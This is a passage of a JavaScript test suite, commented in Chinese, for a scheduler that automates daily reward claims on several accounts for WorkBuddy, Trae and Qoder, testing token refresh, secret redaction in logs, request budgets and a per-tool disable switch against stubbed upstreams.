    const { summary } = await wbTick(kv);
    assert.equal(refreshed, 1, "续期发生了一次以上：新票被自己换掉了");
    assert.equal(JSON.parse(kv.store.get("v1:acct:workbuddy:wb-rot")).cred.refreshToken, "rt-wb-ROTATED");
    // 1 次续期 + 1 次读 + 1 次写 = 3 次额外开销，写回次数从 kv 调用节奏上可查
    assert.ok(!everyWbLog(kv).includes("rt-wb-ROTATED"), "新 refresh_token 进了日志");
    assert.ok(summary.plan.length === 1);
  } finally { stub.restore(); }
});

function everyWbLog(kv) {
  return logKeys(kv).map((k) => `${k}${kv.store.get(k)}${JSON.stringify(kv.metas.get(k) || {})}`).join("\n");
}

test("[workbuddy] 出口只有 copilot.tencent.com，包装格式的票据也能解出 uid", async () => {
  const kv = fakeKv();
  const stub = stubUpstream(wbIdleRoutes());
  try {
    seedWorkbuddy(kv, "wb-wrapped", { wrapped: true });
    const { summary } = await wbTick(kv);
    assert.equal(wbView(summary).uid, "wb-wrapped");
    assert.ok(stub.seen.length > 0);
    assert.ok(stub.seen.every((r) => r.host === WB_HOST), `打出了白名单外的域名：${[...new Set(stub.seen.map((r) => r.host))].join(", ")}`);
    const header = stub.seen[0].headers;
    assert.match(header.Authorization, /^Bearer eyJ/, "包装票据没被展开成真 JWT");
    assert.equal(header["X-User-Id"], "wb-wrapped");
    assert.equal(header["X-Enterprise-Id"], undefined, "个人版不发企业头");
    assert.equal(header["X-Tenant-Id"], undefined);
  } finally { stub.restore(); }
});

test("[workbuddy] 建号走真实入口：明文票据与包装票据都要解出 uid", async () => {
  // 之前这类 bug 全在"直接塞 KV"的测试里溜过去了：uidOf 是每家建号都要过的一道门，
  // 只有走 HTTP 建号才测得到它。
  const kv = fakeKv();
  const env = envFor(kv);
  const plain = mkJwt({ sub: "wb-plain-sub", exp: cst(60) });
  const wrapped = JSON.stringify({ $wbEncrypted: 1, envelope: mkJwt({ sub: "wb-wrapped-sub", exp: cst(60) }) });

  const first = await hit("/account/workbuddy/new", {
    method: "POST", env, body: form({ pwd: PASSWORD, label: "明文", accessToken: plain, refreshToken: "rt-1" }),
  });
  assert.equal(first.status, 303, first.text.match(/class="err">([^<]*)/)?.[1] || "");
  const plainSaved = JSON.parse(kv.store.get("v1:acct:workbuddy:wb-plain-sub"));
  assert.equal(Number(plainSaved.cred.expiresAt), cst(60), "明文票据也要在建号时就解出到期时间");

  const second = await hit("/account/workbuddy/new", {
    method: "POST", env, body: form({ pwd: PASSWORD, label: "包装", accessToken: wrapped, refreshToken: "rt-2" }),
  });
  assert.equal(second.status, 303, second.text.match(/class="err">([^<]*)/)?.[1] || "");
  const saved = JSON.parse(kv.store.get("v1:acct:workbuddy:wb-wrapped-sub"));
  assert.equal(saved.cred.accessToken, wrapped, "包装原文要原样存着，用的时候再展开");
  assert.equal(Number(saved.cred.expiresAt), cst(60), "到期时间要在建号时就解出来，否则第一次运行会白换一次票");
});

test("[jwt] subjectOf 与 expiresAtOf 收的都是 JWT 原文", async () => {
  // 这两个 helper 都收"票"而不是"已解开的载荷"。误传载荷时 subjectOf 会解不出，
  // 但 expiresAtOf 会安静地返回 0 —— 表现是"每天白换一次票"，比报错更难查。
  // 所以两个都要有直接断言，不能只测一个好发现的那半。
  const token = mkJwt({ sub: "sub-a", uid: "sub-b", exp: 1790999999 });
  assert.equal(subjectOf(token), "sub-a");
  assert.equal(expiresAtOf(token), 1790999999);
  assert.equal(subjectOf("不是 JWT"), "");
  assert.equal(expiresAtOf("不是 JWT"), 0);
  assert.equal(expiresAtOf(mkJwt({ sub: "no-exp" })), 0, "没给 exp 要如实返回 0，不能猜一个未来时间");
});

// ═══════════ 三家接入的回归断言 ═══════════
// 这三条是"当前 146 条全绿也抓不到"的那三类：它们不是某个请求出错，而是系统静默地少做事。
// 断言全部写成不变量，而不是写成某一次探针的输出。

test("[审核P0-1] 预算只够一个账号时，排在后面的账号不许饿死", async () => {
  // 形状：WorkBuddy 单账号一轮 36 次，上限 45 → 每个 tick 只装得下 1 个。
  // 上游的机会/额度/任务都远多于一轮的上限，于是三个账号永远以 partial 收，
  // 永远 resumable（豁免 minIntervalSec 与 maxDaily）→ 谁在队首谁永远占满额度。
  const kv = fakeKv();
  const uids = ["wb-A", "wb-B", "wb-C"];
  for (const uid of uids) seedWorkbuddy(kv, uid);
  const many = (n, make) => Array.from({ length: n }, (_, i) => make(i));
  const stub = stubUpstream({
    "POST /v2/billing/meter/checkin-activity-status": wbStatus(),
    "POST /v2/billing/meter/daily-checkin": { payload: { credit: 100 } },
    "GET /v2/activity/growth/buddy/travel/status": { payload: { state: "traveling" } },
    "GET /v2/activity/growth/lottery/chances": { payload: { balance: 500 } },
    "POST /v2/activity/growth/lottery/draw": { payload: { credit: 5 } },
    "GET /v2/activity/growth/buddy/quota": { payload: { affordable: 500 } },
    "POST /v2/activity/growth/buddy/open": { payload: { code: 0, results: [{ credit: 3 }] } },
    "GET /v2/activity/growth/tasks": { payload: { tasks: many(50, (i) => ({ task_code: `t${i}`, progress: { current: 2, target: 1 }, accept_status: "completed", has_reward: true, reward_credit: 10 })) } },
    "POST /activity/growth/tasks/accept": { payload: { code: 0 } },
    "POST /activity/growth/tasks/t0/claim": { payload: { code: 0, already_claimed: false, credit: 10, energy: 5 } },
    "POST /activity/growth/tasks/t1/claim": { payload: { code: 0, already_claimed: false, credit: 10, energy: 5 } },
    "POST /activity/growth/tasks/t2/claim": { payload: { code: 0, already_claimed: false, credit: 10, energy: 5 } },
    "GET /v2/activity/growth/energy": { payload: { balance: 50 } },
    "GET /v2/activity/growth/streak": { payload: { streak: { days: 15 } } },
  });
  try {
    const served = new Set();
    for (let i = 0; i < 12; i += 1) {
      const { summary } = await wbTick(kv, cst(8) + i * 1800);
      assert.equal(summary.ran >= 1, true, `t${i} 一个账号都没跑起来`);
      // "排进来了"不等于"干活了"：预算闸之前只挡账号、不挡步骤，
      // 一个账号可以整进步骤全 deferred 地过一遍 —— 日志、进度键、索引条目都有，
      // 但上游一个请求都没收到。只统计至少做成一步的那几轮。
      for (const a of planOf(summary, "workbuddy").accounts) {
        if (a.steps.some((s) => !s.reused && !["deferred", "skipped"].includes(s.status))) served.add(a.uid);
      }
    }
    for (const uid of uids) {
      assert.ok(served.has(uid), `${uid} 连一步都没做成过。饿死是静默的：不报错、不亮红条，`
        + `运行日志里每次都是 deferred，混在一堆正常顺延里看不出来`);
      const e = schedEntryOf(kv, "workbuddy", uid);
      assert.ok(e.lastAt > 0, `${uid} 从没被记为"真的做过事"（lastAt 未推进）`);
    }
  } finally { stub.restore(); }
});

test("[审核P0-2] 上游改发短票时，一轮的实际子请求不许越过预约上限", async () => {
  // refreshAheadSec 留空 → 兜底 7 天。上游若发 1 小时的短票，"还剩 7 天就别续"恒不成立，
  // 7 个步骤的 guard 会各换一次票：一次性票据一轮烧 7 张，多出的请求也没算进任何 cost。
  const kv = fakeKv();
  seedWorkbuddy(kv, "wb-A", { expiresAt: cst(10) + 300 });
  let refreshes = 0;
  const stub = stubUpstream({
    "POST /v2/plugin/auth/token/refresh": () => {
      refreshes += 1;
      return { payload: { access_token: mkJwt({ sub: "wb-A", exp: cst(11) }), refresh_token: `rt-${refreshes}`, expires_in: 3600 } };
    },
    ...wbIdleRoutes({
      "POST /v2/billing/meter/daily-checkin": { payload: { credit: 100 } },
      "GET /v2/activity/growth/lottery/chances": { payload: { balance: 0 } },
    }),
  });
  try {
    const { budget, summary } = await wbTick(kv);
    const view = wbView(summary);
    assert.equal(refreshes, 1, `一轮换出 ${refreshes} 张票：短票会把每个步骤都变成一次续期`);
    for (const step of view.steps) {
      assert.equal(step.over, 0, `${step.id} 实际超出 cost 预约 ${step.over} 次，累加起来会撞穿平台硬顶`);
    }
    assert.equal(budget.used <= budget.limit, true, `used=${budget.used} 已越过自限 ${budget.limit}：真实的 50 硬顶会掐死整轮，连累已跑完账号的收尾写入`);
    assert.equal(budget.over, 0);
  } finally { stub.restore(); }
});

test("[审核P1-3] 被换掉的旧串不许进任何出口（非 JWT 形态，堵住通用正则的运气）", async () => {
  // 旧串是"这一步之前手里的那把票"。三家的 api.js 都会就地改写 cred，所以内核事后
  // 拿到的 previous 已经是新值 —— 只有开跑前拍快照才抓得住它。
  // 用非 JWT 形态：否则 eyJ… 通用正则会把这次测试"意外救活"，测不到声明式脱敏那条路。
  const kv = fakeKv();
  const OLD = "OLD-OPAQUE-SECRET-9F3K";
  const uid = seedTrae(kv, "991009", { expiresAt: cst(10) + 60 });
  const rec = JSON.parse(kv.store.get(`v1:acct:trae:${uid}`));
  rec.cred.accessToken = OLD;
  kv.store.set(`v1:acct:trae:${uid}`, JSON.stringify(rec));
  const stub = stubUpstream({
    "POST /cloudide/api/v3/trae/oauth/ExchangeToken": { payload: { Result: { Token: mkJwt({ sub: "x", exp: cst(120) }), RefreshToken: "rt-brand-new", TokenExpireAt: cst(120) } } },
    "POST /trae/api/v2/ug/checkin_credits/status": statusOf(false, 0),
    // 上游把"你刚才带来的票"原样回显 —— 4xx 响应体的常见形态
    "POST /trae/api/v2/ug/checkin_credits/claim": { payload: { code: 0, message: `ok ${OLD}`, credits: 5 } },
    "POST /trae/api/v2/pay/ide_user_ent_usage": { payload: { user_entitlement_pack_list: [] } },
  });
  try {
    const { summary } = await traeTick(kv);
    assert.ok(JSON.parse(kv.store.get(`v1:acct:trae:${uid}`)).cred.refreshToken === "rt-brand-new", "前提：这次真的换了票");
    const runKey = [...kv.store.keys()].find((k) => k.startsWith("v1:run:trae:"));
    assert.ok(runKey, "前提：写了运行日志");
    assert.ok(!kv.store.get(runKey).includes(OLD), "旧串进了运行日志正文（KV 存 30 天，详情页点一下就看得到）");
    assert.ok(!JSON.stringify(kv.metas.get(runKey) || {}).includes(OLD), "旧串进了运行日志 metadata");
    assert.ok(!JSON.stringify(summary).includes(OLD), "旧串进了 /api/tick 的返回值");
  } finally { stub.restore(); }
});

test("[审核P0-2b] 收尾写入不许把 used 顶过自限上限（预约不占位的那笔账）", async () => {
  // fits() 是纯判定、不占位。账号闸只问"还剩 6 笔吗"，那 6 笔并没有被留住：
  // 步骤把额度花光之后，收尾的 5 笔（存进度 + 运行日志 + 读新鲜索引 + 合并写回 + 心跳）
  // 是直写、无人拦截，used 于是越过 45。实测 3 个 WorkBuddy 账号连跑，峰值 49 ——
  // 离平台硬顶 50 只剩 1 次，而撞硬顶是整次调用抛异常、把已跑完账号的收尾写入一起作废。
  const kv = fakeKv();
  for (const uid of ["wb-A", "wb-B", "wb-C"]) seedWorkbuddy(kv, uid);
  const stub = stubUpstream({
    "POST /v2/billing/meter/checkin-activity-status": wbStatus(),
    "POST /v2/billing/meter/daily-checkin": { payload: { credit: 100 } },
    "GET /v2/activity/growth/buddy/travel/status": { payload: { state: "traveling" } },
    "GET /v2/activity/growth/lottery/chances": { payload: { balance: 500 } },
    "POST /v2/activity/growth/lottery/draw": { payload: { credit: 5 } },
    "GET /v2/activity/growth/buddy/quota": { payload: { affordable: 500 } },
    "POST /v2/activity/growth/buddy/open": { payload: { code: 0, results: [{ credit: 3 }] } },
    "GET /v2/activity/growth/tasks": { payload: { tasks: Array.from({ length: 50 }, (_, i) => ({ task_code: `t${i}`, progress: { current: 2, target: 1 }, accept_status: "completed", has_reward: true, reward_credit: 10 })) } },
    "POST /activity/growth/tasks/accept": { payload: { code: 0 } },
    "POST /activity/growth/tasks/t0/claim": { payload: { code: 0, already_claimed: false, credit: 10, energy: 5 } },
    "POST /activity/growth/tasks/t1/claim": { payload: { code: 0, already_claimed: false, credit: 10, energy: 5 } },
    "POST /activity/growth/tasks/t2/claim": { payload: { code: 0, already_claimed: false, credit: 10, energy: 5 } },
    "GET /v2/activity/growth/energy": { payload: { balance: 50 } },
    "GET /v2/activity/growth/streak": { payload: { streak: { days: 15 } } },
  });
  try {
    for (let i = 0; i < 8; i += 1) {
      const kvBefore = kv.count; const netBefore = stub.seen.length;
      const { budget } = await wbTick(kv, cst(8) + i * 1800);
      assert.equal(budget.over, 0, `t${i}：used=${budget.used} 越过了自限 ${budget.limit}，收尾写入无处可付`);
      assert.equal(budget.used <= budget.limit, true, `t${i}：used=${budget.used}`);
      // 账本必须与真实发生的一致：这一轮的 KV 笔数 + 上游笔数 = used。
      // 少记一笔，45 的自限就是假的，平台 50 的硬顶会在没人预料的时候出现
      const real = (kv.count - kvBefore) + (stub.seen.length - netBefore);
      assert.equal(budget.used, real, `t${i}：账本记了 ${budget.used} 笔，实际发生 ${real} 笔`);
    }
    // 就地顺延不许花钱：被账号闸挡下的账号不该留下锁、进度、日志三笔写
    const logs = [...kv.store.keys()].filter((k) => k.startsWith("v1:run:workbuddy:"));
    assert.ok(logs.length > 0, "前提：这一串轮次写过运行日志");
  } finally { stub.restore(); }

  // 最坏路径还得叠上"这一步同时换了票"：内核会当场把新串写回 KV（读新鲜 + 写 = 2 笔），
  // 这 2 笔也算在收尾里、没有任何闸门挡着。TAIL_RESERVE 少了它们就会再次越界。
  {
    const kv2 = fakeKv();
    seedTrae(kv2, "991099", { expiresAt: cst(10) + 60 });
    let ex = 0;
    const stub2 = stubUpstream({
      "POST /cloudide/api/v3/trae/oauth/ExchangeToken": () => {
        ex += 1;
        return { payload: { Result: { Token: mkJwt({ sub: "x", exp: cst(120) }), RefreshToken: `rt-R${ex}`, TokenExpireAt: cst(120) } } };
      },
      "POST /trae/api/v2/ug/checkin_credits/status": (rec, n) => (n === 2
        ? { status: 401, body: "" }
        : { payload: { checked_in: false, credits: 0, enable: true } }),
      "POST /trae/api/v2/ug/checkin_credits/claim": { payload: { code: 0, message: "签到成功", credits: 5 } },
      "POST /trae/api/v2/pay/ide_user_ent_usage": { payload: { user_entitlement_pack_list: [] } },
    });
    try {
      const { budget, summary } = await traeTick(kv2);
      const v = planOf(summary, "trae").accounts[0];
      assert.equal(ex, 2, "前提：这一轮真的走了两次换票（临期一次 + 401 后强制一次）");
      for (const s of v.steps) assert.equal(s.over, 0, `${s.id} 实测超出 cost 预约 ${s.over} 笔`);
      assert.equal(budget.over, 0, `used=${budget.used} 越过了自限 ${budget.limit}`);
      assert.equal(budget.used <= budget.limit, true);
    } finally { stub2.restore(); }
  }
});


test("[审核P0-2c] 收尾最坏 7 笔没预约住时，宁可整步顺延也不许把 used 顶过自限", async () => {
  // 这一步如实花掉它预约的笔数，所以单看步骤本身没有"低估"。
  // 越界来自它做完之后的 7 笔：凭据写回 2 + 存进度 1 + 运行日志 1 + 索引合并写回 2 + 心跳 1。
  // cost=32 是挑出来的判别值：预约 7 笔时它整步顺延（used 停在 12），
  // 只预约 5 笔时它被放行，做完之后 used 冲到 46 —— over=1，而平台硬顶是 50。
  const kv = fakeKv();
  kv.store.set("v1:tool:rot", "{}");
  kv.store.set("v1:acct:rot:R1", JSON.stringify({
    label: "R1", cred: { seatId: "R1", session: "OLD-SESSION-STRING" }, createdAt: 1, updatedAt: 1,
  }));
  kv.store.set("v1:schedidx:rot", JSON.stringify({ day: null, entries: {} }));
  const tool = {
    id: "rot", name: "轮换夹具", order: 1, summary: "", config: [],
    creds: [{ key: "seatId", label: "席位", required: true }, { key: "session", label: "会话", secret: true }],
    schedule: { resetHour: 0, notBeforeHour: 0, minIntervalSec: 1800, maxDaily: 10, backoff: [] },
    hosts: [], uidOf: (ctx) => String(ctx.values.seatId || "").trim(),
    steps: [{
      id: "big", label: "大步骤", cost: 32,
      async run(ctx) {
        for (let i = 0; i < 32; i += 1) await ctx.kv.get(`v1:pad:${i}`);   // 如实花掉预约的 32 笔
        return { status: "claimed", message: "ok", credits: 1, cred: { session: "NEW-SESSION-STRING" } };
      },
    }],
  };
  const { budget, summary } = await tickWith(kv, [tool], 45, cst(10));
  const view = planOf(summary, "rot").accounts[0];
  assert.equal(budget.over, 0, `used=${budget.used} 越过自限 ${budget.limit}：收尾那 7 笔没被预约住，真实平台上这是整次调用抛异常`);
  assert.equal(budget.used <= budget.limit, true, `used=${budget.used}`);
  assert.equal(view.steps[0].status, "deferred", "装不下收尾余量的步骤必须整步顺延，而不是做完再把账本顶穿");
});

test("[审核P0-3] 成功路径（HTTP 200 + code:0）必须有断言：blindbox 与 redeem 不许报 error", async () => {
  // 这条测试补的是"测试形状"的洞，不是实现洞：workbuddy 的桩测只用 409/403，
  // 而 `result.status >= 400 || api.codeOf(...)` 在 4xx 时短路，右侧根本不执行 ——
  // 于是 api.codeOf 没被导出这件事，在 11 条 workbuddy 测试全绿的情况下活了很久。
  // 后果不在"报错"上：buddy/open 没有幂等字段，上游已经真的扣了额度、开了盒子，
  // 本地却记成 error、不进进度表 → 下一轮再开一次。
  const kv = fakeKv();
  seedWorkbuddy(kv);
  const stub = stubUpstream({
    "POST /v2/billing/meter/checkin-activity-status": wbStatus(),
    "POST /v2/billing/meter/daily-checkin": { payload: { credit: 100 } },
    "GET /v2/activity/growth/buddy/travel/status": { payload: { state: "traveling" } },
    "GET /v2/activity/growth/lottery/chances": { payload: { balance: 0 } },
    "GET /v2/activity/growth/buddy/quota": { payload: { affordable: 2 } },
    "POST /v2/activity/growth/buddy/open": { payload: { code: 0, results: [{ credit: 3 }] } },
    "GET /v2/activity/growth/tasks": { payload: { tasks: [] } },
    "GET /v2/activity/growth/energy": { payload: { balance: 50 } },
    "GET /v2/activity/growth/streak": { payload: { streak: { days: 15 } } },
    "POST /v2/activity/growth/redeem": { payload: { code: 0, credit_granted: 20 } },
  });
  try {
    const { summary } = await wbTick(kv);
    const view = wbView(summary);
    const byId = Object.fromEntries(view.steps.map((s) => [s.id, s]));
    assert.equal(byId.blindbox.status, "claimed", `blindbox 在最普通的成功路径上翻了：${byId.blindbox.message}`);
    assert.equal(byId.redeem.status, "claimed", `redeem 在最普通的成功路径上翻了：${byId.redeem.message}`);
    assert.equal(view.steps.filter((s) => s.status === "error").length, 0,
      view.steps.filter((s) => s.status === "error").map((s) => `${s.id}: ${s.message}`).join("；"));
  } finally { stub.restore(); }
});

// ═══════════ 工具停用开关 ═══════════
//
// 设计要点（照 §6.1 实现，不要凭直觉改）：
//   · 单键 v1:flags 存全部工具，FLAGS_FRAME=1 在 runTick 开头读一次贯穿本轮
//   · 判 off 的位置在 TOOL_FRAME 之前 —— 停用中的工具一笔 KV 都不花
//   · 停用时绝不删 step / schedidx / acct / lock，重开即续跑
//   · 隐藏「执行」不等于权限：runAccountNow 自己在打上游之前再判一次
//   · 不做「全部停用」总开关（用户明确拒绝过）
const offFlags = (kv, ids) => kv.store.set("v1:flags", JSON.stringify(Object.fromEntries(ids.map((id) => [id, { off: true, at: cst(12) }]))));
const onFlags = (kv, ids) => kv.store.set("v1:flags", JSON.stringify(Object.fromEntries(ids.map((id) => [id, { off: false, at: cst(12) }]))));
// 合成工具的凭据字段一律叫 seatId，所以给第 N 家 seeding 时键前缀也要跟着换。
// 忘了这一步会得到一个"没有账号"的工具，于是"关掉 A 不影响 B"这种断言
// 变成在验证 B 压根没被调度过 —— 假绿。
const seedFor = (kv, toolId, uid) => {
  seedConfig(kv);
  kv.store.set(`v1:acct:${toolId}:${uid}`, JSON.stringify({
    label: uid, cred: { seatId: uid, plan: "pro", session: SECRET_VALUE }, createdAt: 1, updatedAt: 1,
  }));
  kv.store.set(`v1:schedidx:${toolId}`, JSON.stringify({ day: null, entries: {} }));
};

test("[关掉一个工具：连跑 5 轮它一条记录都不留，且一个 KV 键都不碰", async () => {
  const kv = fakeKv();
  const qoder = { ...syntheticTool("qoder"), name: "Qoder" };
  const trae = { ...syntheticTool("trae"), name: "Trae" };
  seedFor(kv, "qoder", "SEATQ1");
  seedFor(kv, "trae", "SEATT1");

  // 基准：两家都开着时 qoder 那一轮真实的键轨迹长度（后面拿它对照"关掉之后 = 0"）
  const base = fakeKv();
  seedFor(base, "qoder", "SEATQ1");
  seedFor(base, "trae", "SEATT1");
  await tickWith(base, [qoder, trae], 45, cst(10));
  const qoderKeysWhenOn = base.countKeys("v1:acct:qoder:") + base.countKeys("v1:tool:qoder") + base.countKeys("v1:schedidx:qoder")
    + base.countKeys("v1:step:qoder:") + base.countKeys("v1:heartbeat:qoder") + base.countKeys("v1:run:qoder:");
  assert.ok(qoderKeysWhenOn > 0, "基准无效：开着的时候本来就没碰 qoder 的键，这套断言测不出东西");

  offFlags(kv, ["qoder"]);
  for (let round = 0; round < 5; round += 1) {
    const mark = kv.mark();
    const { summary } = await tickWith(kv, [qoder, trae], 45, cst(10, round * 30));
    const q = planOf(summary, "qoder");
    assert.equal(q.skipped, "已停用", `第 ${round + 1} 轮：停用的工具不该进调度`);
    assert.deepEqual(q.accounts, [], `第 ${round + 1} 轮：停用工具名下出现了账号`);
    // 判据 1 的核心：关掉的那家一个 KV 键都不许碰 —— 读配置、列账号也都算。
    // 只断言"没记日志"是不够的：日志只在真的有账号跑过时才写，
    // 而"读了配置、列了账号、什么都没跑"正是开关插错位置时会露出的形态。
    assert.equal(kv.countKeys("v1:tool:qoder", mark), 0, `第 ${round + 1} 轮：停用期间仍读了 qoder 的配置`);
    assert.equal(kv.countKeys("v1:acct:qoder:", mark), 0, `第 ${round + 1} 轮：停用期间仍列了 qoder 的账号`);
    assert.equal(kv.countKeys("v1:schedidx:qoder", mark), 0, `第 ${round + 1} 轮：停用期间仍读了 qoder 的调度索引`);
    assert.equal(kv.countKeys("v1:heartbeat:qoder", mark), 0, `第 ${round + 1} 轮：停用期间仍写了 qoder 的心跳`);
  }
  assert.equal(logKeys(kv).filter((k) => k.includes("qoder")).length, 0, "/runs 里不该出现任何 qoder 新记录");
  // 判据 5：关 A 不影响 B/C 的调度与计数
  assert.ok(logKeys(kv).some((k) => k.includes("trae")), "关掉 A 不该让 B 也停下");
});

test("[停用期间删不得任何东西：重开后当天进度接着做，已完成的那步不重做", async () => {
  // 判据 2。停用只是"不跑"，不是"忘掉"：删掉 step / schedidx 的话，
  // 重开后就变成从零开始，WorkBuddy 那种 7 步的账号会重打一遍上游（其中 buddy/open 真扣额度）。
  const kv = fakeKv();
  seedAccount(kv, "SEATD1");
  const runs = [];
  const tool = (steps) => syntheticTool("fix", steps);
  // 一步成功 + 一步极贵（装不下）→ 正好造出"做了一半"的形态
  const steps = [
    { id: "a", label: "甲", cost: 3, async run() { runs.push("a"); return { status: "claimed", message: "甲成了", credits: 1 }; } },
    { id: "b", label: "乙", cost: 30, async run() { runs.push("b"); return { status: "claimed", message: "乙成了", credits: 1 }; } },
    { id: "c", label: "丙", cost: 3, async run() { runs.push("c"); return { status: "claimed", message: "丙成了", credits: 1 }; } },
  ];
  // 先跑一轮：a 做成，b 装不下顺延
  const first = await tickWith(kv, [tool(steps)], 22, cst(10));
  assert.equal(first.summary.plan[0].accounts[0].steps[0].status, "claimed", "前置：这一轮该做成 a");
  assert.equal(first.summary.plan[0].accounts[0].steps[1].status, "deferred", "前置：b 该装不下");
  const done = Object.keys(JSON.parse(kv.store.get("v1:step:fix:SEATD1")).done);
  assert.deepEqual(done, ["a"], "前置：进度键里只该有 a");

  // 关掉，两小时后再打开（锁的 TTL 90s，靠虚拟时钟过期）
  offFlags(kv, ["fix"]);
  const mark = kv.mark();
  const gap = await tickWith(kv, [tool(steps)], 45, cst(12));
  assert.equal(gap.summary.plan[0].skipped, "已停用");
  // 判据 2 的字面要求：这几类键一个都不许少
  assert.ok(kv.store.has("v1:step:fix:SEATD1"), "停用把步骤进度删了：重开后要从零开始，7 步的账号会重打一遍上游");
  assert.ok(kv.store.has("v1:acct:fix:SEATD1"), "停用把账号记录删了");
  assert.ok(kv.store.has("v1:schedidx:fix"), "停用把调度索引删了：lastAt 归零会让所有账号挤成同一批");
  assert.deepEqual(Object.keys(JSON.parse(kv.store.get("v1:step:fix:SEATD1")).done), ["a"],
    "停用期间进度键被改动了：重开后会重做已完成的步骤");
  assert.equal(kv.countKeys("v1:step:fix:", mark), 0, "停用期间碰了步骤进度键");
  assert.equal(kv.countKeys("v1:acct:fix:", mark), 0, "停用期间碰了账号记录");
  assert.equal(kv.countKeys("v1:schedidx:fix", mark), 0, "停用期间碰了调度索引");

  // 重新打开 → 接着做，且 a 不重做
  onFlags(kv, ["fix"]);
  runs.length = 0;
  const back = await tickWith(kv, [tool(steps)], 45, cst(12, 5));
  const view = back.summary.plan[0].accounts[0];
  assert.deepEqual(runs, ["b", "c"], `重开后该从 b 接着做，实际跑了 ${JSON.stringify(runs)} —— a 被重做了`);
  assert.equal(view.steps[0].reused, true, "a 是复用，不该真的打上游");
  assert.equal(view.status, "claimed", "三步做完就该是成功领取");
});

test("[停用跨过 resetHour 再打开：按新逻辑日照常从头跑", async () => {
  // 判据 3。这是 loadProgress 的既有行为（跨 day 视为全未做），**不该**为开关特殊化。
  // 写这条测试正是为了钉住它：哪天有人给开关加个"保留进度"逻辑，跨天那次的重跑就没了。
  const kv = fakeKv();
  seedAccount(kv, "SEATR1");
  const ran = [];
  const steps = [
    { id: "a", label: "甲", cost: 3, async run() { ran.push("a"); return { status: "claimed", message: "甲", credits: 1 }; } },
    { id: "b", label: "乙", cost: 30, async run() { ran.push("b"); return { status: "claimed", message: "乙", credits: 1 }; } },
  ];
  await tickWith(kv, [syntheticTool("fix", steps)], 22, cst(10));
  assert.deepEqual(ran, ["a"], "前置：D 日只做成了 a");

  offFlags(kv, ["fix"]);
  // 停用期间跨过 10:00 的日界（cst(10,40) 是 D+1 日 10:40，不是当天 10:40 ——
  // DAY 定在 D 日 00:00，加 10 小时 40 分仍在 D 日。这里必须真跨天，
  // 否则验的是"同一天隔 40 分钟"，而那种情况本来就该复用进度）
  await tickWith(kv, [syntheticTool("fix", steps)], 45, cst(34, 40));
  onFlags(kv, ["fix"]);
  ran.length = 0;
  const next = await tickWith(kv, [syntheticTool("fix", steps)], 45, cst(35, 10));
  // 新的一天预算充足，a 与 b 都会真跑。关键不是"只跑 a"，而是 **a 又跑了一次**：
  // 昨天做过的步骤不会被当成已完成而跳过。
  assert.ok(ran.includes("a"), `新逻辑日该从头跑（a 必须再做一次），实际 ${JSON.stringify(ran)}`);
  assert.equal(!!next.summary.plan[0].accounts[0].steps[0].reused, false, "新的一天不该复用昨天的进度");
  // 全部步骤结清后进度键会被 clearProgress 删掉（这是既有行为），所以"记在哪一天"
  // 要看调度索引里的 lastStatusDate —— 它证明这一轮归属的是新逻辑日。
  assert.equal(schedEntryOf(kv, "fix", "SEATR1").lastStatusDate, logicalDay(0, cst(35, 10)),
    "这一轮该记在新逻辑日下，而不是把昨天的归属留着");
  // attempts 是**当天**计数（跨日归零），所以新的一天从 1 重新开始 —— 这正是
  // maxDaily 按天生效的实现方式。若哪天它变成累计值，maxDaily 就会跨日失效。
  assert.equal(schedEntryOf(kv, "fix", "SEATR1").attempts, 1, "attempts 该按天归零，而不是累计");
  assert.equal(schedEntryOf(kv, "fix", "SEATR1").attemptsDate, logicalDay(0, cst(35, 10)));
});

fixtureTest("[停用中直接 POST 手动执行：被拒绝，且一个上游请求都不许发", async () => {
  // 判据 4。界面上「执行」按钮已经隐藏了，但隐藏不等于权限 ——
  // 直接敲 URL 不该绕过开关。断言必须落在 stub.seen 上：
  // 只断言"页面返回了拒绝"的话，把 run() 换成"先发请求再拒绝"照样绿。
  const kv = fakeKv();
  seedAccount(kv, "SEATX1");
  const stub = stubUpstream({ "POST /stub/claim": { payload: { ok: true } } });
  const tool = {
    ...syntheticTool("fix", [{ id: "claim", label: "领取", cost: 3, async run(ctx) {
      await ctx.fetch("https://stub.example/stub/claim", { method: "POST", body: "{}" });
      return { status: "claimed", message: "不该走到这里", credits: 1 };
    } }]),
    hosts: ["stub.example"],
  };
  try {
    const toolId = tool.id;
    kv.store.set("v1:tool:fix", JSON.stringify({ portal: "cn", timeoutSec: "15" }));
    offFlags(kv, [toolId]);
    const view = await runAccountNow({ env: envFor(kv), budget: makeBudget(45), tool, uid: "SEATX1", trigger: "manual", now: cst(10) });
    assert.equal(view.status, "error", "停用中的工具不该被手动执行");
    assert.match(view.message, /已停用/, `回执要说清为什么：${view.message}`);
    assert.equal(stub.seen.length, 0, `被拒绝了却还是发了 ${stub.seen.length} 个上游请求：隐藏按钮不等于权限`);
    // 走路由也一样拒
    const page = await hit("/account/fix/SEATX1/run", { method: "POST", body: form({ pwd: PASSWORD }), env: envFor(kv) });
    assert.match(page.text, /已停用/, "页面上要看得见拒绝的原因");
    assert.equal(stub.seen.length, 0, "直接敲 URL 绕过了开关");

    // 打开后同一条路由就该真跑 —— 证明刚才的拒绝不是"路由坏了"
    onFlags(kv, [toolId]);
    const allowed = await runAccountNow({ env: envFor(kv), budget: makeBudget(45), tool, uid: "SEATX1", trigger: "manual", now: cst(10) });
    assert.equal(allowed.status, "claimed", "开关打开后手动执行该真的能跑：拒绝不是路由坏了");
    assert.equal(stub.seen.length, 1);
  } finally { stub.restore(); }
});

fixtureTest("[界面：停用的卡片变暗 + 显示开关状态，停用中隐藏「执行」保留「测试」", async () => {
  const kv = fakeKv();
  const env = envFor(kv);
  await createAccount(env, kv);
  // 必须先造一个"需要处理"的账号，否则红条那一条根本无从验证：
  // stuck 为 0 时红条两条分支都渲染成空，改代码它照样绿 —— 那是空断言。
  kv.store.set("v1:schedidx:fix", JSON.stringify({
    day: null, entries: { ABCD1234: { ...schedOf(), lastStatus: "login_required", lastStatusDate: logicalDay(0, cst(10)) } },
  }));

  const on = await authed("/", env);
  assert.match(on.text, /1 个账号需要处理/, "前置：开着的时候红条该亮");

  offFlags(kv, ["fix"]);
  const home = await authed("/", env);
  assert.match(home.text, /已停用/, "卡片上要看得见这个工具停着");
  assert.match(home.text, /class="card dim"/, "停用的卡片要变暗（复用 .dim）");
  // 停用中不亮红条，但"需要处理"的数字照常显示 —— 下线中的工具报错不是用户的待办，
  // 而用户点进去仍要看得见停在哪、为什么停。
